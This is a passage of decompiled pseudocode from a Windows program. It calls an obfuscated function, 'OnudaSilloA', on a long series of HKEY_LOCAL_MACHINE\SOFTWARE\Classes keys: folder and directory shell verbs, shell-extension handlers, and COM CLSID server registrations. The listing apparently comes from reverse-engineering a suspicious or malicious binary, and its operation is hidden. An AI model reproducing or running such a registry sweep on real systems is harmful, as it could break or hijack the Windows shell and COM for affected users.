  loc_00455534: var_B7A0 = OnudaSilloA(global_80000002, var_B79C)
  loc_00455539: call var_B7A4 = global_00401054
  loc_00455542: call var_B7A8 = global_004011CC
  loc_00455558: call var_B7AC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\open")
  loc_00455564: var_B7B0 = OnudaSilloA(global_80000002, var_B7AC)
  loc_00455569: call var_B7B4 = global_00401054
  loc_00455572: call var_B7B8 = global_004011CC
  loc_00455588: call var_B7BC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\explore\ddeexec\topic")
  loc_00455594: var_B7C0 = OnudaSilloA(global_80000002, var_B7BC)
  loc_00455599: call var_B7C4 = global_00401054
  loc_004555A2: call var_B7C8 = global_004011CC
  loc_004555B8: call var_B7CC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\explore\ddeexec\ifexec")
  loc_004555C4: var_B7D0 = OnudaSilloA(global_80000002, var_B7CC)
  loc_004555C9: call var_B7D4 = global_00401054
  loc_004555D2: call var_B7D8 = global_004011CC
  loc_004555E8: call var_B7DC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\explore\ddeexec\application")
  loc_004555F4: var_B7E0 = OnudaSilloA(global_80000002, var_B7DC)
  loc_004555F9: call var_B7E4 = global_00401054
  loc_00455602: call var_B7E8 = global_004011CC
  loc_00455618: call var_B7EC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\explore\ddeexec")
  loc_00455624: var_B7F0 = OnudaSilloA(global_80000002, var_B7EC)
  loc_00455629: call var_B7F4 = global_00401054
  loc_00455632: call var_B7F8 = global_004011CC
  loc_00455648: call var_B7FC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\explore\command")
  loc_00455654: var_B800 = OnudaSilloA(global_80000002, var_B7FC)
  loc_00455659: call var_B804 = global_00401054
  loc_00455662: call var_B808 = global_004011CC
  loc_00455678: call var_B80C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\explore")
  loc_00455684: var_B810 = OnudaSilloA(global_80000002, var_B80C)
  loc_00455689: call var_B814 = global_00401054
  loc_00455692: call var_B818 = global_004011CC
  loc_004556A8: call var_B81C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\open\command")
  loc_004556B4: var_B820 = OnudaSilloA(global_80000002, var_B81C)
  loc_004556B9: call var_B824 = global_00401054
  loc_004556C2: call var_B828 = global_004011CC
  loc_004556D8: call var_B82C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\open")
  loc_004556E4: var_B830 = OnudaSilloA(global_80000002, var_B82C)
  loc_004556E9: call var_B834 = global_00401054
  loc_004556F2: call var_B838 = global_004011CC
  loc_00455708: call var_B83C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell")
  loc_00455714: var_B840 = OnudaSilloA(global_80000002, var_B83C)
  loc_00455719: call var_B844 = global_00401054
  loc_00455722: call var_B848 = global_004011CC
  loc_00455738: call var_B84C = global_00401188(var_24, "SOFTWARE\Classes\Folder\DefaultIcon")
  loc_00455744: var_B850 = OnudaSilloA(global_80000002, var_B84C)
  loc_00455749: call var_B854 = global_00401054
  loc_00455752: call var_B858 = global_004011CC
  loc_00455768: call var_B85C = global_00401188(var_24, "SOFTWARE\Classes\Folder")
  loc_00455774: var_B860 = OnudaSilloA(global_80000002, var_B85C)
  loc_00455779: call var_B864 = global_00401054
  loc_00455782: call var_B868 = global_004011CC
  loc_00455798: call var_B86C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\Sharing")
  loc_004557A4: var_B870 = OnudaSilloA(global_80000002, var_B86C)
  loc_004557A9: call var_B874 = global_00401054
  loc_004557B2: call var_B878 = global_004011CC
  loc_004557C8: call var_B87C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\{ef43ecfe-2ab9-4632-bf21-58909dd177f0}")
  loc_004557D4: var_B880 = OnudaSilloA(global_80000002, var_B87C)
  loc_004557D9: call var_B884 = global_00401054
  loc_004557E2: call var_B888 = global_004011CC
  loc_004557F8: call var_B88C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\{ECCDF543-45CC-11CE-B9BF-0080C87CDBA6}")
  loc_00455804: var_B890 = OnudaSilloA(global_80000002, var_B88C)
  loc_00455809: call var_B894 = global_00401054
  loc_00455812: call var_B898 = global_004011CC
  loc_00455828: call var_B89C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\{596AB062-B4D2-4215-9F74-E9109B0A8153}")
  loc_00455834: var_B8A0 = OnudaSilloA(global_80000002, var_B89C)
  loc_00455839: call var_B8A4 = global_00401054
  loc_00455842: call var_B8A8 = global_004011CC
  loc_00455858: call var_B8AC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers\{1F2E5C40-9550-11CE-99D2-00AA006E086C}")
  loc_00455864: var_B8B0 = OnudaSilloA(global_80000002, var_B8AC)
  loc_00455869: call var_B8B4 = global_00401054
  loc_00455872: call var_B8B8 = global_004011CC
  loc_00455888: call var_B8BC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\PropertySheetHandlers")
  loc_00455894: var_B8C0 = OnudaSilloA(global_80000002, var_B8BC)
  loc_00455899: call var_B8C4 = global_00401054
  loc_004558A2: call var_B8C8 = global_004011CC
  loc_004558B8: call var_B8CC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\DragDropHandlers\WinRAR")
  loc_004558C4: var_B8D0 = OnudaSilloA(global_80000002, var_B8CC)
  loc_004558C9: call var_B8D4 = global_00401054
  loc_004558D2: call var_B8D8 = global_004011CC
  loc_004558E8: call var_B8DC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\DragDropHandlers")
  loc_004558F4: var_B8E0 = OnudaSilloA(global_80000002, var_B8DC)
  loc_004558F9: call var_B8E4 = global_00401054
  loc_00455902: call var_B8E8 = global_004011CC
  loc_00455918: call var_B8EC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers\Sharing")
  loc_00455924: var_B8F0 = OnudaSilloA(global_80000002, var_B8EC)
  loc_00455929: call var_B8F4 = global_00401054
  loc_00455932: call var_B8F8 = global_004011CC
  loc_00455948: call var_B8FC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers\MyDocuments")
  loc_00455954: var_B900 = OnudaSilloA(global_80000002, var_B8FC)
  loc_00455959: call var_B904 = global_00401054
  loc_00455962: call var_B908 = global_004011CC
  loc_00455978: call var_B90C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers\FileSystem")
  loc_00455984: var_B910 = OnudaSilloA(global_80000002, var_B90C)
  loc_00455989: call var_B914 = global_00401054
  loc_00455992: call var_B918 = global_004011CC
  loc_004559A8: call var_B91C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers\CDF")
  loc_004559B4: var_B920 = OnudaSilloA(global_80000002, var_B91C)
  loc_004559B9: call var_B924 = global_00401054
  loc_004559C2: call var_B928 = global_004011CC
  loc_004559D8: call var_B92C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\CopyHookHandlers")
  loc_004559E4: var_B930 = OnudaSilloA(global_80000002, var_B92C)
  loc_004559E9: call var_B934 = global_00401054
  loc_004559F2: call var_B938 = global_004011CC
  loc_00455A08: call var_B93C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\WinRAR")
  loc_00455A14: var_B940 = OnudaSilloA(global_80000002, var_B93C)
  loc_00455A19: call var_B944 = global_00401054
  loc_00455A22: call var_B948 = global_004011CC
  loc_00455A38: call var_B94C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\Sharing")
  loc_00455A44: var_B950 = OnudaSilloA(global_80000002, var_B94C)
  loc_00455A49: call var_B954 = global_00401054
  loc_00455A52: call var_B958 = global_004011CC
  loc_00455A68: call var_B95C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\Offline Files")
  loc_00455A74: var_B960 = OnudaSilloA(global_80000002, var_B95C)
  loc_00455A79: call var_B964 = global_00401054
  loc_00455A82: call var_B968 = global_004011CC
  loc_00455A98: call var_B96C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\EncryptionMenu")
  loc_00455AA4: var_B970 = OnudaSilloA(global_80000002, var_B96C)
  loc_00455AA9: call var_B974 = global_00401054
  loc_00455AB2: call var_B978 = global_004011CC
  loc_00455AC8: call var_B97C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers")
  loc_00455AD4: var_B980 = OnudaSilloA(global_80000002, var_B97C)
  loc_00455AD9: call var_B984 = global_00401054
  loc_00455AE2: call var_B988 = global_004011CC
  loc_00455AF8: call var_B98C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shellex")
  loc_00455B04: var_B990 = OnudaSilloA(global_80000002, var_B98C)
  loc_00455B09: call var_B994 = global_00401054
  loc_00455B12: call var_B998 = global_004011CC
  loc_00455B28: call var_B99C = global_00401188(var_24, "SOFTWARE\Classes\Directory\shell\find\ddeexec\topic")
  loc_00455B34: var_B9A0 = OnudaSilloA(global_80000002, var_B99C)
  loc_00455B39: call var_B9A4 = global_00401054
  loc_00455B42: call var_B9A8 = global_004011CC
  loc_00455B58: call var_B9AC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shell\find\ddeexec\application")
  loc_00455B64: var_B9B0 = OnudaSilloA(global_80000002, var_B9AC)
  loc_00455B69: call var_B9B4 = global_00401054
  loc_00455B72: call var_B9B8 = global_004011CC
  loc_00455B88: call var_B9BC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shell\find\ddeexec")
  loc_00455B94: var_B9C0 = OnudaSilloA(global_80000002, var_B9BC)
  loc_00455B99: call var_B9C4 = global_00401054
  loc_00455BA2: call var_B9C8 = global_004011CC
  loc_00455BB8: call var_B9CC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shell\find\command")
  loc_00455BC4: var_B9D0 = OnudaSilloA(global_80000002, var_B9CC)
  loc_00455BC9: call var_B9D4 = global_00401054
  loc_00455BD2: call var_B9D8 = global_004011CC
  loc_00455BE8: call var_B9DC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shell\find")
  loc_00455BF4: var_B9E0 = OnudaSilloA(global_80000002, var_B9DC)
  loc_00455BF9: call var_B9E4 = global_00401054
  loc_00455C02: call var_B9E8 = global_004011CC
  loc_00455C18: call var_B9EC = global_00401188(var_24, "SOFTWARE\Classes\Directory\shell")
  loc_00455C24: var_B9F0 = OnudaSilloA(global_80000002, var_B9EC)
  loc_00455C29: call var_B9F4 = global_00401054
  loc_00455C32: call var_B9F8 = global_004011CC
  loc_00455C48: call var_B9FC = global_00401188(var_24, "SOFTWARE\Classes\Directory\DefaultIcon")
  loc_00455C54: var_BA00 = OnudaSilloA(global_80000002, var_B9FC)
  loc_00455C59: call var_BA04 = global_00401054
  loc_00455C62: call var_BA08 = global_004011CC
  loc_00455C78: call var_BA0C = global_00401188(var_24, "SOFTWARE\Classes\Directory\Background\shellex\ContextMenuHandlers\New")
  loc_00455C84: var_BA10 = OnudaSilloA(global_80000002, var_BA0C)
  loc_00455C89: call var_BA14 = global_00401054
  loc_00455C92: call var_BA18 = global_004011CC
  loc_00455CA8: call var_BA1C = global_00401188(var_24, "SOFTWARE\Classes\Directory\Background\shellex\ContextMenuHandlers")
  loc_00455CB4: var_BA20 = OnudaSilloA(global_80000002, var_BA1C)
  loc_00455CB9: call var_BA24 = global_00401054
  loc_00455CC2: call var_BA28 = global_004011CC
  loc_00455CD8: call var_BA2C = global_00401188(var_24, "SOFTWARE\Classes\Directory\Background\shellex")
  loc_00455CE4: var_BA30 = OnudaSilloA(global_80000002, var_BA2C)
  loc_00455CE9: call var_BA34 = global_00401054
  loc_00455CF2: call var_BA38 = global_004011CC
  loc_00455D08: call var_BA3C = global_00401188(var_24, "SOFTWARE\Classes\Directory\Background")
  loc_00455D14: var_BA40 = OnudaSilloA(global_80000002, var_BA3C)
  loc_00455D19: call var_BA44 = global_00401054
  loc_00455D22: call var_BA48 = global_004011CC
  loc_00455D38: call var_BA4C = global_00401188(var_24, "SOFTWARE\Classes\Directory")
  loc_00455D44: var_BA50 = OnudaSilloA(global_80000002, var_BA4C)
  loc_00455D49: call var_BA54 = global_00401054
  loc_00455D52: call var_BA58 = global_004011CC
  loc_00455D68: call var_BA5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000001-4FEF-40D3-B3FA-E0531B897F98}\InprocServer32")
  loc_00455D74: var_BA60 = OnudaSilloA(global_80000002, var_BA5C)
  loc_00455D79: call var_BA64 = global_00401054
  loc_00455D82: call var_BA68 = global_004011CC
  loc_00455D98: call var_BA6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000001-4FEF-40D3-B3FA-E0531B897F98}")
  loc_00455DA4: var_BA70 = OnudaSilloA(global_80000002, var_BA6C)
  loc_00455DA9: call var_BA74 = global_00401054
  loc_00455DB2: call var_BA78 = global_004011CC
  loc_00455DC8: call var_BA7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000010-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00455DD4: var_BA80 = OnudaSilloA(global_80000002, var_BA7C)
  loc_00455DD9: call var_BA84 = global_00401054
  loc_00455DE2: call var_BA88 = global_004011CC
  loc_00455DF8: call var_BA8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000010-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00455E04: var_BA90 = OnudaSilloA(global_80000002, var_BA8C)
  loc_00455E09: call var_BA94 = global_00401054
  loc_00455E12: call var_BA98 = global_004011CC
  loc_00455E28: call var_BA9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000010-0000-0010-8000-00AA006D2EA4}")
  loc_00455E34: var_BAA0 = OnudaSilloA(global_80000002, var_BA9C)
  loc_00455E39: call var_BAA4 = global_00401054
  loc_00455E42: call var_BAA8 = global_004011CC
  loc_00455E58: call var_BAAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000011-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00455E64: var_BAB0 = OnudaSilloA(global_80000002, var_BAAC)
  loc_00455E69: call var_BAB4 = global_00401054
  loc_00455E72: call var_BAB8 = global_004011CC
  loc_00455E88: call var_BABC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000011-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00455E94: var_BAC0 = OnudaSilloA(global_80000002, var_BABC)
  loc_00455E99: call var_BAC4 = global_00401054
  loc_00455EA2: call var_BAC8 = global_004011CC
  loc_00455EB8: call var_BACC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000011-0000-0010-8000-00AA006D2EA4}")
  loc_00455EC4: var_BAD0 = OnudaSilloA(global_80000002, var_BACC)
  loc_00455EC9: call var_BAD4 = global_00401054
  loc_00455ED2: call var_BAD8 = global_004011CC
  loc_00455EE8: call var_BADC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000013-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00455EF4: var_BAE0 = OnudaSilloA(global_80000002, var_BADC)
  loc_00455EF9: call var_BAE4 = global_00401054
  loc_00455F02: call var_BAE8 = global_004011CC
  loc_00455F18: call var_BAEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000013-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00455F24: var_BAF0 = OnudaSilloA(global_80000002, var_BAEC)
  loc_00455F29: call var_BAF4 = global_00401054
  loc_00455F32: call var_BAF8 = global_004011CC
  loc_00455F48: call var_BAFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000013-0000-0010-8000-00AA006D2EA4}")
  loc_00455F54: var_BB00 = OnudaSilloA(global_80000002, var_BAFC)
  loc_00455F59: call var_BB04 = global_00401054
  loc_00455F62: call var_BB08 = global_004011CC
  loc_00455F78: call var_BB0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000014-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00455F84: var_BB10 = OnudaSilloA(global_80000002, var_BB0C)
  loc_00455F89: call var_BB14 = global_00401054
  loc_00455F92: call var_BB18 = global_004011CC
  loc_00455FA8: call var_BB1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000014-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00455FB4: var_BB20 = OnudaSilloA(global_80000002, var_BB1C)
  loc_00455FB9: call var_BB24 = global_00401054
  loc_00455FC2: call var_BB28 = global_004011CC
  loc_00455FD8: call var_BB2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000014-0000-0010-8000-00AA006D2EA4}")
  loc_00455FE4: var_BB30 = OnudaSilloA(global_80000002, var_BB2C)
  loc_00455FE9: call var_BB34 = global_00401054
  loc_00455FF2: call var_BB38 = global_004011CC
  loc_00456008: call var_BB3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000015-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456014: var_BB40 = OnudaSilloA(global_80000002, var_BB3C)
  loc_00456019: call var_BB44 = global_00401054
  loc_00456022: call var_BB48 = global_004011CC
  loc_00456038: call var_BB4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000015-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00456044: var_BB50 = OnudaSilloA(global_80000002, var_BB4C)
  loc_00456049: call var_BB54 = global_00401054
  loc_00456052: call var_BB58 = global_004011CC
  loc_00456068: call var_BB5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000015-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456074: var_BB60 = OnudaSilloA(global_80000002, var_BB5C)
  loc_00456079: call var_BB64 = global_00401054
  loc_00456082: call var_BB68 = global_004011CC
  loc_00456098: call var_BB6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000015-0000-0010-8000-00AA006D2EA4}")
  loc_004560A4: var_BB70 = OnudaSilloA(global_80000002, var_BB6C)
  loc_004560A9: call var_BB74 = global_00401054
  loc_004560B2: call var_BB78 = global_004011CC
  loc_004560C8: call var_BB7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000016-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_004560D4: var_BB80 = OnudaSilloA(global_80000002, var_BB7C)
  loc_004560D9: call var_BB84 = global_00401054
  loc_004560E2: call var_BB88 = global_004011CC
  loc_004560F8: call var_BB8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000016-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456104: var_BB90 = OnudaSilloA(global_80000002, var_BB8C)
  loc_00456109: call var_BB94 = global_00401054
  loc_00456112: call var_BB98 = global_004011CC
  loc_00456128: call var_BB9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000016-0000-0010-8000-00AA006D2EA4}")
  loc_00456134: var_BBA0 = OnudaSilloA(global_80000002, var_BB9C)
  loc_00456139: call var_BBA4 = global_00401054
  loc_00456142: call var_BBA8 = global_004011CC
  loc_00456158: call var_BBAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000017-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00456164: var_BBB0 = OnudaSilloA(global_80000002, var_BBAC)
  loc_00456169: call var_BBB4 = global_00401054
  loc_00456172: call var_BBB8 = global_004011CC
  loc_00456188: call var_BBBC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000017-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456194: var_BBC0 = OnudaSilloA(global_80000002, var_BBBC)
  loc_00456199: call var_BBC4 = global_00401054
  loc_004561A2: call var_BBC8 = global_004011CC
  loc_004561B8: call var_BBCC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000017-0000-0010-8000-00AA006D2EA4}")
  loc_004561C4: var_BBD0 = OnudaSilloA(global_80000002, var_BBCC)
  loc_004561C9: call var_BBD4 = global_00401054
  loc_004561D2: call var_BBD8 = global_004011CC
  loc_004561E8: call var_BBDC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000018-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_004561F4: var_BBE0 = OnudaSilloA(global_80000002, var_BBDC)
  loc_004561F9: call var_BBE4 = global_00401054
  loc_00456202: call var_BBE8 = global_004011CC
  loc_00456218: call var_BBEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000018-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456224: var_BBF0 = OnudaSilloA(global_80000002, var_BBEC)
  loc_00456229: call var_BBF4 = global_00401054
  loc_00456232: call var_BBF8 = global_004011CC
  loc_00456248: call var_BBFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000018-0000-0010-8000-00AA006D2EA4}")
  loc_00456254: var_BC00 = OnudaSilloA(global_80000002, var_BBFC)
  loc_00456259: call var_BC04 = global_00401054
  loc_00456262: call var_BC08 = global_004011CC
  loc_00456278: call var_BC0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000019-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00456284: var_BC10 = OnudaSilloA(global_80000002, var_BC0C)
  loc_00456289: call var_BC14 = global_00401054
  loc_00456292: call var_BC18 = global_004011CC
  loc_004562A8: call var_BC1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000019-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_004562B4: var_BC20 = OnudaSilloA(global_80000002, var_BC1C)
  loc_004562B9: call var_BC24 = global_00401054
  loc_004562C2: call var_BC28 = global_004011CC
  loc_004562D8: call var_BC2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000019-0000-0010-8000-00AA006D2EA4}")
  loc_004562E4: var_BC30 = OnudaSilloA(global_80000002, var_BC2C)
  loc_004562E9: call var_BC34 = global_00401054
  loc_004562F2: call var_BC38 = global_004011CC
  loc_00456308: call var_BC3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}\InprocServer32")
  loc_00456314: var_BC40 = OnudaSilloA(global_80000002, var_BC3C)
  loc_00456319: call var_BC44 = global_00401054
  loc_00456322: call var_BC48 = global_004011CC
  loc_00456338: call var_BC4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000002F-0000-0000-C000-000000000046}")
  loc_00456344: var_BC50 = OnudaSilloA(global_80000002, var_BC4C)
  loc_00456349: call var_BC54 = global_00401054
  loc_00456352: call var_BC58 = global_004011CC
  loc_00456368: call var_BC5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000100-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00456374: var_BC60 = OnudaSilloA(global_80000002, var_BC5C)
  loc_00456379: call var_BC64 = global_00401054
  loc_00456382: call var_BC68 = global_004011CC
  loc_00456398: call var_BC6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000100-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_004563A4: var_BC70 = OnudaSilloA(global_80000002, var_BC6C)
  loc_004563A9: call var_BC74 = global_00401054
  loc_004563B2: call var_BC78 = global_004011CC
  loc_004563C8: call var_BC7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000100-0000-0010-8000-00AA006D2EA4}")
  loc_004563D4: var_BC80 = OnudaSilloA(global_80000002, var_BC7C)
  loc_004563D9: call var_BC84 = global_00401054
  loc_004563E2: call var_BC88 = global_004011CC
  loc_004563F8: call var_BC8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000101-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00456404: var_BC90 = OnudaSilloA(global_80000002, var_BC8C)
  loc_00456409: call var_BC94 = global_00401054
  loc_00456412: call var_BC98 = global_004011CC
  loc_00456428: call var_BC9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000101-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456434: var_BCA0 = OnudaSilloA(global_80000002, var_BC9C)
  loc_00456439: call var_BCA4 = global_00401054
  loc_00456442: call var_BCA8 = global_004011CC
  loc_00456458: call var_BCAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000101-0000-0010-8000-00AA006D2EA4}")
  loc_00456464: var_BCB0 = OnudaSilloA(global_80000002, var_BCAC)
  loc_00456469: call var_BCB4 = global_00401054
  loc_00456472: call var_BCB8 = global_004011CC
  loc_00456488: call var_BCBC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000103-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456494: var_BCC0 = OnudaSilloA(global_80000002, var_BCBC)
  loc_00456499: call var_BCC4 = global_00401054
  loc_004564A2: call var_BCC8 = global_004011CC
  loc_004564B8: call var_BCCC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000103-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_004564C4: var_BCD0 = OnudaSilloA(global_80000002, var_BCCC)
  loc_004564C9: call var_BCD4 = global_00401054
  loc_004564D2: call var_BCD8 = global_004011CC
  loc_004564E8: call var_BCDC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000103-0000-0010-8000-00AA006D2EA4}")
  loc_004564F4: var_BCE0 = OnudaSilloA(global_80000002, var_BCDC)
  loc_004564F9: call var_BCE4 = global_00401054
  loc_00456502: call var_BCE8 = global_004011CC
  loc_00456518: call var_BCEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000104-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456524: var_BCF0 = OnudaSilloA(global_80000002, var_BCEC)
  loc_00456529: call var_BCF4 = global_00401054
  loc_00456532: call var_BCF8 = global_004011CC
  loc_00456548: call var_BCFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000104-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00456554: var_BD00 = OnudaSilloA(global_80000002, var_BCFC)
  loc_00456559: call var_BD04 = global_00401054
  loc_00456562: call var_BD08 = global_004011CC
  loc_00456578: call var_BD0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000104-0000-0010-8000-00AA006D2EA4}")
  loc_00456584: var_BD10 = OnudaSilloA(global_80000002, var_BD0C)
  loc_00456589: call var_BD14 = global_00401054
  loc_00456592: call var_BD18 = global_004011CC
  loc_004565A8: call var_BD1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000105-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_004565B4: var_BD20 = OnudaSilloA(global_80000002, var_BD1C)
  loc_004565B9: call var_BD24 = global_00401054
  loc_004565C2: call var_BD28 = global_004011CC
  loc_004565D8: call var_BD2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000105-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_004565E4: var_BD30 = OnudaSilloA(global_80000002, var_BD2C)
  loc_004565E9: call var_BD34 = global_00401054
  loc_004565F2: call var_BD38 = global_004011CC
  loc_00456608: call var_BD3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000105-0000-0010-8000-00AA006D2EA4}")
  loc_00456614: var_BD40 = OnudaSilloA(global_80000002, var_BD3C)
  loc_00456619: call var_BD44 = global_00401054
  loc_00456622: call var_BD48 = global_004011CC
  loc_00456638: call var_BD4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000106-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00456644: var_BD50 = OnudaSilloA(global_80000002, var_BD4C)
  loc_00456649: call var_BD54 = global_00401054
  loc_00456652: call var_BD58 = global_004011CC
  loc_00456668: call var_BD5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000106-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456674: var_BD60 = OnudaSilloA(global_80000002, var_BD5C)
  loc_00456679: call var_BD64 = global_00401054
  loc_00456682: call var_BD68 = global_004011CC
  loc_00456698: call var_BD6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000106-0000-0010-8000-00AA006D2EA4}")
  loc_004566A4: var_BD70 = OnudaSilloA(global_80000002, var_BD6C)
  loc_004566A9: call var_BD74 = global_00401054
  loc_004566B2: call var_BD78 = global_004011CC
  loc_004566C8: call var_BD7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000107-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_004566D4: var_BD80 = OnudaSilloA(global_80000002, var_BD7C)
  loc_004566D9: call var_BD84 = global_00401054
  loc_004566E2: call var_BD88 = global_004011CC
  loc_004566F8: call var_BD8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000107-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00456704: var_BD90 = OnudaSilloA(global_80000002, var_BD8C)
  loc_00456709: call var_BD94 = global_00401054
  loc_00456712: call var_BD98 = global_004011CC
  loc_00456728: call var_BD9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000107-0000-0010-8000-00AA006D2EA4}")
  loc_00456734: var_BDA0 = OnudaSilloA(global_80000002, var_BD9C)
  loc_00456739: call var_BDA4 = global_00401054
  loc_00456742: call var_BDA8 = global_004011CC
  loc_00456758: call var_BDAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000108-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00456764: var_BDB0 = OnudaSilloA(global_80000002, var_BDAC)
  loc_00456769: call var_BDB4 = global_00401054
  loc_00456772: call var_BDB8 = global_004011CC
